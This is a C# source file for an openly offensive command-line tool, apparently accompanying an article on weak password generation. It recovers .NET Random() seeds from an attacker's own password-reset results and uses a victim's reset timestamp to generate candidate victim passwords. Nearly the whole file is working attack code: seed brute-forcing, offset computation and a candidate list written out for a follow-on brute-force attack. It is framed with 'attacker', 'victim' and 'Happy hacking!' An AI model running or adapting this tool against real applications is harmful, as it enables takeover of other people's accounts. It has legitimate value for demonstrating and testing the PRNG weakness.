using Newtonsoft.Json;

namespace PrngOracle
{
    class PrngResult
    {
        public string Result { get; set; }
        public DateTime Timestamp { get; set; }
        [Newtonsoft.Json.JsonIgnore]
        public int Seed { get; set; }

        public PrngResult(DateTime timestamp, string result)
        {
            Timestamp = timestamp;
            Result = result;
            Seed = -1;
        }

        public override string ToString() {
            return string.Format("Timestamp: \"{0}\"; Result: \"{1}\"; Seed: {2}", Timestamp, Result, Seed);
        }
    }

    class Program
    {
        public static List<PrngResult> results = new List<PrngResult>();

        public static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine(@"
                [!] Usage: PrngOracle <attacker_prng_results_file> <victim_prng_timestamp>

                [!] Description: 
                    PrngOracle is a CLI tool for predicting output generated with PRNG algorithms in .NET Framework apps.
                    Predicting is done by brute-forcing a TickCount value used to seed the PRNG and create the output; computing possible seeds
                    in the future by adding a relative time offset between two given generations used for the subsequent generations. Tool generates
                    a list of plausible PRNG outputs for a subsequent brute-force attack.

                    Note: you need to know the algorithm used to create the output. Attack implies that each Random() instance is only used once.

                [!] Parameters:
                    <attacker_prng_results_file> - Path to the JSON file containing attacker's PRNG result generations.
                                                      The file should be formatted like this:
                                                      [
                                                        {""Timestamp"": ""TIMESTAMP_OF_RESET_REQUEST_1"",""Result"": ""GENERATED_RESULT_1""}
                                                        {""Timestamp"": ""TIMESTAMP_OF_RESET_REQUEST_2"",""Result"": ""GENERATED_RESULT_2""}
                                                        ...
                                                      ]
                                                      For example:
                                                      [{""Timestamp"": ""Thu, 21 Apr 2022 20:59:12 GMT"",""Result"": ""!CJ.4nFHmYZ*""}]

                    <victim_prng_timestamp>      - Value of Date response header from a 

                [!] Example Usage:
                    PrngOracle attacker_results.json ""Thu, 21 Apr 2022 20:59:12 GMT""
                ");
                return;
            }

            try
            {
                // reading the file with all PRNG results
                results = JsonConvert.DeserializeObject<List<PrngResult>>(File.ReadAllText(args[0]));

                Console.WriteLine(String.Format("[!] Parsed PRNG results: [\n\t\"{0}\"\n]", String.Join("\",\n\t\"", results)));

                DateTime victimTimestamp = DateTime.Parse(args[1]);
                Console.WriteLine(String.Format("[!] Parsed victim PRNG result timestamp: \"{0}\"", victimTimestamp));

                // multi-threading rulez
                Console.WriteLine("[!] Brute-forcing Random() seeds for the results");
                Parallel.ForEach(results, (result) => { bruteforceSeed(result); });
                
                Console.WriteLine("[!] Generating possible results in a 2 second window");
                generatePossibleResults(results, victimTimestamp, 2000);

                Console.WriteLine("[+] Done! Happy hacking!");
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine(ex.ToString());
            }
        }


        private static void generatePossibleResults(List<PrngResult> resets, DateTime victimTimestamp, int window)
        {
            // Write results to file
            string resultsFilePath = Path.Join(Directory.GetCurrentDirectory(), "results.txt");
            StreamWriter stream = new(resultsFilePath);

            foreach (PrngResult pr in resets)
            {
                if (pr.Seed == -1)
                {
                    Console.WriteLine("[-] Skipping result \"{0}\"; unknown seed value", pr);
                    continue;
                }

                // compute time offset between attacker's and victim's reset timestamps
                int offset = Math.Abs((int)(victimTimestamp - pr.Timestamp).TotalMilliseconds);
                Console.WriteLine(
                    string.Format(
                        "[*] Attacker's timestamp: \"{0}\"; Victim's timestamp: \"{1}\"; Offset in milliseconds: {2}", 
                        pr.Timestamp, 
                        victimTimestamp, 
                        offset
                    )
                );

                Console.WriteLine("[*] Computed victim's seed value: {0} +- 2000 milliseconds", pr.Seed + offset);

                // Iterate over all seeds in window
                for (int i = pr.Seed + offset - window; i < pr.Seed + offset + window; i++)
                {
                    // Write generated result to file
                    stream.WriteLine(getResult(i));
                }
            }
            stream.Close();

            Console.WriteLine("[+] Possible results saved to {0}", resultsFilePath);
        }


        private static void bruteforceSeed(PrngResult pr)
        {
            // iterate over all possible seed values 
            for (uint i = 0; i < UInt32.MaxValue; i++)
            {
                if (i % (1 << 24) == 0)
                {
                    // intermediate progress for bruteforcing
                    Console.WriteLine(
                        string.Format(
                            "[*] [{0}] Result: \"{1}\"; {2:F2}% done. {3:N0} values processed",
                            DateTime.Now.ToString("HH:mm:ss"),
                            pr.Result,
                            i / (float)UInt32.MaxValue * 100, i
                        )
                    );
                }
                if (getResult((int)i) == pr.Result)
                {
                    // found seed!
                    pr.Seed = (int)i;

                    Console.WriteLine(
                        string.Format(
                            "[+] [{0}] Result: \"{1}\"; Found! Seed: {2:D0}",
                            DateTime.Now.ToString("HH:mm:ss"),
                            pr.Result,
                            pr.Seed
                        )
                    );

                    return;
                }
            }
            Console.WriteLine("[-] Exhausted ...");
        }


        
        private static string getResult(int seed)
        {
            // replace this code with your algorithm
            // example weak password generation algorithm
            // used in the article
            Random random = new Random(seed);
            string password = ""; 
            for (int i = 0; i < 12; i++)
            {
                password += (char)random.Next(32, 127);
            }
            return password;
        }
    }
}